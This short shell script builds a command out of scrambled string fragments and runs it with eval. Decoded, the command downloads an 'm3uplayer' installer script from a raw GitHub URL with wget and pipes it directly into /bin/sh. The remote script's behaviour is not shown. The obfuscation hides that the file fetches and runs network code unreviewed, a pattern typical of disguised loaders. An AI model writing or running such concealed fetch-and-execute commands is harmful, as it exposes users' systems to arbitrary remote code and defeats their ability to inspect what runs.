z="
";Lz='37/m';Pz='n/in';Sz='sh -';Uz='| /b';Oz='/mai';Nz='ayer';Wz='h';Vz='in/s';Ez='.git';Tz='O - ';Cz='ps:/';Hz='onte';Az='wget';Jz='om/e';Bz=' htt';Kz='mil2';Fz='hubu';Iz='nt.c';Mz='3upl';Dz='/raw';Rz='ler.';Qz='stal';Gz='serc';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz"